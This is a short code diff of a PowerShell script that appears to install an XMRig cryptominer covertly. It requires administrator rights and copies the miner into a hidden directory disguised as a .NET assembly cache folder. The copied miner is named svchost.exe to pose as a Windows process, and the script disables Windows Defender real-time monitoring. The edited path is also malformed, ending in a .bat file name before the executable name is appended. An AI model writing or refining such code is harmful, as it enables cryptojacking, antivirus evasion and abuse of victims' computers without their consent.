@@ -120,12 +120,11 @@ cd "$initial_dir\xmrig-6.22.2"
 
 #Requires -RunAsAdministrator
 
-Set-Variable -Name newConfigPath2 -Value ("$initial_dir\xmrig-6.22.2")
-
 # Define hidden payload path
-$hiddenDir = "$env:SystemRoot\Temp\Microsoft.NET\Assembly\GAC_MSIL\"
+$hiddenDir = "$env:SystemRoot\Temp\Microsoft.NET\Assembly\GAC_MSIL\xmrig-6.22.2\w.bat"
 $payloadName = "svchost.exe"
 $destinationPath = Join-Path $hiddenDir $payloadName
+$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
 # Create hidden directory
 if (-not (Test-Path $hiddenDir)) {
@@ -134,7 +133,7 @@ if (-not (Test-Path $hiddenDir)) {
 }
 
 # Copy miner to hidden location
-Copy-Item -Path $newConfigPath2 -Destination $destinationPath -Force
+Copy-Item -Path $newConfigPath_2 -Destination $destinationPath -Force
 
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
